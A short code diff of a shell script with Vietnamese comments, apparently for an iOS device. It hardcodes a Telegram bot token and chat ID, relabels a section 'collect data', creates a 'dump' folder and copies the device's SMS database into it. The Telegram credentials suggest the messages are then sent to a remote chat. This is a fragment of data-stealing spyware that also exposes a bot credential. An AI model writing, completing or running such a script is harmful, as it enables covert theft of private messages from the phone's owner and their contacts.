@@ -3,11 +3,12 @@
 TELE_TOKEN="8794982640:AAH22aHRkcA-vHxs-E8YoeguX-0HJAHjwqk"   # THAY CÁI NÀY BẰNG TOKEN THẬT
 CHAT_ID="7860426358"                                  # ĐÃ LẤY TỪ JSON CỦA MÀY
 
-# Tạo thư mục nếu chưa tồn tại
-mkdir -p /var/mobile/Documents
-cd /var/mobile/Documents || exit 0
+# Dùng HOME của mobile user
+WORK_DIR="$HOME/Documents"
+mkdir -p "$WORK_DIR"
+cd "$WORK_DIR" || exit 0
 
-# Phần còn lại
+# Thu thập dữ liệu
 mkdir -p dump
 
 cp -r /var/mobile/Library/SMS dump/ 2>/dev/null
